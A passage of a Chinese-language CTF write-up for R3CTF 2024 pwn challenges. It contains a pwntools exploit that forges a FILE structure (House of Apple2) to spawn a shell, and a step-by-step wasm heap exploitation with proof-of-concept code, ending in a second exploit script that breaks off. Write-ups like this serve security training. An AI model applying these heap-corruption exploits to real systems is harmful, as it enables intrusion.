class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;ctf2024-entry.r3kapig.com&#x27;</span>, <span class=\"number\">30371</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;127.0.0.1&#x27;, 9999)</span></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./chall&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(elf_patch)</span></span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;0x&#x27;</span>)</span><br><span class=\"line\">libc_base = <span class=\"built_in\">int</span>(r(<span class=\"number\">12</span>), <span class=\"number\">16</span>)<span class=\"comment\"># + 0x6d80</span></span><br><span class=\"line\"></span><br><span class=\"line\">environ = libc_base + libc.sym[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\">system, binsh = get_sb()</span><br><span class=\"line\">stdin = libc_base + libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class=\"line\">stdin_IO_buf_base = stdin + <span class=\"number\">7</span>*<span class=\"number\">8</span></span><br><span class=\"line\">stdin_old_value = stdin + <span class=\"number\">0x83</span></span><br><span class=\"line\">stdout = libc_base + libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class=\"line\">stderr = libc_base + libc.sym[<span class=\"string\">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># step 2 : printf -&gt; stdout -&gt; house of apple2</span></span><br><span class=\"line\">system, binsh = get_sb()</span><br><span class=\"line\">_IO_wfile_jumps = libc_base + <span class=\"number\">0x202228</span></span><br><span class=\"line\"></span><br><span class=\"line\">base_addr = stdout</span><br><span class=\"line\"></span><br><span class=\"line\">fake_io = <span class=\"string\">b&#x27;  sh;\\x00\\x00\\x00&#x27;</span> </span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0x68</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io += p64(system)</span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0x88</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io += p64(base_addr + <span class=\"number\">0x5000</span>) <span class=\"comment\"># _lock</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">fake_io += p64(base_addr)</span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0xd8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io += p64(_IO_wfile_jumps - <span class=\"number\">0x20</span>)</span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0xe0</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_io += p64(base_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">sla(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">sla(<span class=\"string\">b&#x27;Mem: &#x27;</span>, <span class=\"built_in\">hex</span>(stdin_IO_buf_base))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x12c3)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;&gt; &#x27;</span>, p64(stdin_old_value)*<span class=\"number\">3</span> + p64(base_addr) + p64(base_addr + <span class=\"built_in\">len</span>(fake_io) + <span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">sl(fake_io)</span><br><span class=\"line\"></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">inter()</span><br><span class=\"line\">pause()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Feedback-Portal\"><a href=\"#Feedback-Portal\" class=\"headerlink\" title=\"Feedback Portal\"></a>Feedback Portal</h2><p>是一个 wasm 的堆题目，分析逆向了很久。</p>\n<p><a href=\"https://github.com/WebAssembly/wabt\">https://github.com/WebAssembly/wabt</a></p>\n<p>先 clone 并且 make 上面的项目，同时利用下面的命令进行反编译</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Desktop/pwn-tools/wabt/bin/wasm2wat ./chall -o wat.wasm</span><br></pre></td></tr></table></figure>\n\n<p>可以得到 wasm 的汇编形式的文本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Desktop/pwn-tools/wabt/bin/wasm2c ./chall -o wat.c</span><br></pre></td></tr></table></figure>\n\n<p>这样就得到了 wat.c 和 wat.h ，接着进行编译，方便用 ida 分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c wat.c -g -o wat -I ~/path/to/wabt/wasm2c/</span><br></pre></td></tr></table></figure>\n\n<p>就得到一个 ida 可以反汇编的二进制文件</p>\n<p>漏洞点是 delete 功能的 idx 可以越界，poc 可以触发 crash，但是程序的堆管理是另外一套，不是 ptmalloc，所以在没有定位程序加载后的内存地址的情况下，不好做</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/6b7e0db599637f7ccf93399edba6fb28.png\" alt=\"6b7e0db599637f7ccf93399edba6fb28\"></p>\n<p>poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create(0x20, b&#x27;a&#x27;)</span><br><span class=\"line\">create(0x20, b&#x27;a&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(107)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/143978de12caa7f17007d86c34fa0775.png\" alt=\"143978de12caa7f17007d86c34fa0775\"></p>\n<p>可以发现触发了一个 crash </p>\n<p>因为是 delete 触发的 crash，一开始是想看看 rsi 是怎么来的，但是回溯发现 rsi 是来自于函数的调用参数，上一个函数比较难看，所以就直接 search 搜索</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search -4 0xfffffffb</span><br></pre></td></tr></table></figure>\n\n<p>但是搜索结果比较多，于是换成 delete(109) 也能触发 crash</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/a8c0305cef868332cbb35f88482ea9fb.png\" alt=\"a8c0305cef868332cbb35f88482ea9fb\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search -4 0x555475c4</span><br></pre></td></tr></table></figure>\n\n<p>但是没搜到结果，继续看汇编</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/6862db955ade739d725e27f8749c3023.png\" alt=\"6862db955ade739d725e27f8749c3023\"></p>\n<p>可以看到 rsi 取值之前 - 4 了，所以要 + 4 搜索</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/3d9af66e33733ecfe85b3e3173430ee0.png\" alt=\"3d9af66e33733ecfe85b3e3173430ee0\"></p>\n<p>可以找到两个结果，其中一共结果会发现 - 0x8 处，是 0xffffffff ，结合 delete(107) 的 crash 的结果，可以判断这处内存是正确的，再接着看下 index 为 0 处的内存</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/82ac999c3b2f04130f738d260d3e8f9d.png\" alt=\"82ac999c3b2f04130f738d260d3e8f9d\"></p>\n<p>从这里可以看出， 0x14c0 处是存放的 heap_ptr ，而他们共同的基址是 </p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/6f6e14037d485760b3dc7febc029132d.png\" alt=\"6f6e14037d485760b3dc7febc029132d\"></p>\n<p>其中从 ida 里面也是可以看出</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/8967c3171a37781e9b7fb82e6e53dde1.png\"></p>\n<p>但是这之后我们也明确了 w2c_memory 是指向基址的，到这里就对 wasm 的堆寻址有了一个大概的认识</p>\n<p>但是通过 delete 越界漏洞并不能完成利用，这里其实还有另外一个漏洞，因为不能够准确打断点，为了方便调试，先把 alsr 关闭</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>\n\n<p>poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create(0x20, b&#x27;a&#x27;)</span><br><span class=\"line\">create(0x20, b&#x27;a&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(0, b&#x27;a&#x27;*0x40 + b&#x27;\\n&#x27;) # delete(0)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/c010132e4245d6ac8d69bf450c5ac68a.png\" alt=\"c010132e4245d6ac8d69bf450c5ac68a\"></p>\n<p>当 edit 数据超过原本堆块大小时候，堆块会被 free，但是 heap_ptr 上的指针并没有更新，这个漏洞导致了 uaf</p>\n<p>继续看 0x16a8 的指向内存，明显这处内存和 ptmalloc 的 main_arena 差不多，实现了双向链表</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/8b015b4be4429790e78e98b6add6f59c.png\" alt=\"8b015b4be4429790e78e98b6add6f59c\"></p>\n<p>由于 wasmtime 是利用的 dlmalloc，所以攻击方式会不太一样，这里如果我们去修改 fd 的话，那么就可以进行任意地址分配</p>\n<p>poc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create(<span class=\"number\">0x20</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x20</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x40</span> + <span class=\"string\">b&#x27;\\n&#x27;</span>) <span class=\"comment\"># delete(0)</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p32(<span class=\"number\">0x300</span>) + <span class=\"string\">b&#x27;\\n&#x27;</span>) <span class=\"comment\"># free chunk fd -&gt; 0x300</span></span><br><span class=\"line\">create(<span class=\"number\">0x20</span>, <span class=\"string\">b&#x27;a&#x27;</span>) <span class=\"comment\"># set fake_fd -&gt; main_arena</span></span><br><span class=\"line\">create(<span class=\"number\">0x20</span>, <span class=\"string\">b&#x27;a&#x27;</span>) <span class=\"comment\"># alloc base + 0x300</span></span><br></pre></td></tr></table></figure>\n\n<p>第一次 create 时候</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/af46a1f05fa71a54d8802dba8ef8f830.png\"></p>\n<p>第二次 create 时候，成功分配到了 0x308</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/93e9cca2167b6b9c0c4300166c11f012.png\" alt=\"93e9cca2167b6b9c0c4300166c11f012\"></p>\n<p>那么就可以通过这个，去分配到 heap_ptr 上面，实现无限的任意地址写</p>\n<p>poc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create(<span class=\"number\">0x40</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x40</span>, <span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x60</span> + <span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p32(<span class=\"number\">0x14c0</span> - <span class=\"number\">0x30</span> - <span class=\"number\">8</span>) + <span class=\"string\">b&#x27;\\n&#x27;</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x40</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x40</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>接着就是劫持程序执行流了，如果去看上面处理得到 wat.wasm 文件</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/295370583bdcaa71025fe72b8801fc51.png\" alt=\"295370583bdcaa71025fe72b8801fc51\"></p>\n<p>会发现其定义了函数表，并且将 59 61 63 64 86 13 这六个函数保存到表中，下面的则是加载所要用到的数据，可以看到 banner.txt</p>\n<p>其中 banner.txt 和 r，应该是文件名和文件打开方式，如果在 gdb 里面看的话，</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/f819d355f0cd685effa76b630a5891e4.png\" alt=\"f819d355f0cd685effa76b630a5891e4\"></p>\n<p>可以发现数据偏移是 0x400，而 banner.txt 和 r 的偏移是 0x424 和 0x42f ，那么如果转化为十进制 1060 和 1071 在 wat.wasm 文件中查找的话</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/4644a27884a9da607658da431b85ce9f.png\" alt=\"4644a27884a9da607658da431b85ce9f\"></p>\n<p>可以发现有处地方调用了这两个值</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/4eb381c38a7be5edbf52c986af26ffd2.png\" alt=\"4eb381c38a7be5edbf52c986af26ffd2\"></p>\n<p>往上找可以发现是 func 13 ，是表中第 6 个函数</p>\n<p>但是是没法从文件和 ida 中看到函数表地址的，如果是保存在  w2c_memory 内存中，那么直接覆盖足够多的数据，令其 crash 即可</p>\n<p>poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create(0x40, b&#x27;a&#x27;)</span><br><span class=\"line\">create(0x40, b&#x27;a&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(0, b&#x27;a&#x27;*0x60 + b&#x27;\\n&#x27;)</span><br><span class=\"line\">edit(0, p32(0x14c0 - 0x30 - 8) + b&#x27;\\n&#x27;) </span><br><span class=\"line\"></span><br><span class=\"line\">create(0x40, b&#x27;\\x00&#x27;)</span><br><span class=\"line\">create(0x40, b&#x27;\\x00&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(3, p64(0)*6 + p32(0x14c0) + p32(0x300) + b&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(1, b&#x27;a&#x27;*0x800 + b&#x27;\\n&#x27;)</span><br><span class=\"line\">edit(1, b&#x27;a&#x27;*0x800 + b&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p>会 crash 在这里</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/07299603958a35d6a98b8263039495ce.png\" alt=\"07299603958a35d6a98b8263039495ce\"></p>\n<p>比较符合出题人给出的 exp 中的修改 0x14 和 0x20</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/568edd5d69f8369c2c37d93668e961c1.png\" alt=\"568edd5d69f8369c2c37d93668e961c1\"></p>\n<p>我试了下，如果 0x14 ！&#x3D; 0 ，那么就会取出 0x20 的值，然后去找出函数表执行</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/916d26bfe25c8e0406dd377a1f976cdf.png\" alt=\"916d26bfe25c8e0406dd377a1f976cdf\"></p>\n<p>判断师傅小于函数表的大小 7 后，接着 call 一个可以返回对应函数指针和参数的堆地址</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/4264af0d7758b92819a0b9f4bc06161f.png\" alt=\"4264af0d7758b92819a0b9f4bc06161f\"></p>\n<p>是执行 wasmtime 中对应从表取值函数</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/092950c0d35800e8c95ac76bc70d95bf.png\" alt=\"092950c0d35800e8c95ac76bc70d95bf\"></p>\n<p>最后执行取出的函数，但是没根据这个分析出函数表的地址</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/1d91c8a2a8e5accf2a5e9b21b2718778.png\" alt=\"1d91c8a2a8e5accf2a5e9b21b2718778\"></p>\n<p>不过可以从 crash 处判断，会发现图红框处是存放编译后的 wasm 代码，可以以这个为基址，打断点到 crash 处</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/4670033147e2f19bfbf4b52c7b6820ed.png\" alt=\"4670033147e2f19bfbf4b52c7b6820ed\"></p>\n<p>发现正常情况下，偏移是 0x1228 </p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/506b91353437123d54690316fc9587af.png\" alt=\"506b91353437123d54690316fc9587af\"></p>\n<p>于是只需要修改 banner.txt 为 flag.txt ，同时修改 0x1228 处的内存，令其跳转执行 orw 输出 flag 即可</p>\n<p>效果</p>\n<p><img src=\"/2024/07/29/2024_R3CTF_part1/99992aadbb3c59c434c8d7a03839967e.png\" alt=\"99992aadbb3c59c434c8d7a03839967e\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;120.46.65.156&#x27;, 32104)</span></span><br><span class=\"line\"><span class=\"comment\">#elf_patch = &#x27;./gostack&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">env = &#123;<span class=\"string\">&#x27;WASMTIME_NEW_CLI&#x27;</span>: <span class=\"string\">&#x27;0&#x27;</span>&#125;</span><br><span class=\"line\">command = [<span class=\"string\">&#x27;./wasmtime&#x27;</span>, <span class=\"string\">&#x27;--config=./cache.toml&#x27;</span>, <span class=\"string\">&#x27;--dir=.&#x27;</span>, <span class=\"string\">&#x27;./chall&#x27;</span>]</span><br><span class=\"line\">p = process(command, env=env)</span><br><span class=\"line\"></span><br><span class=\"line\"><span 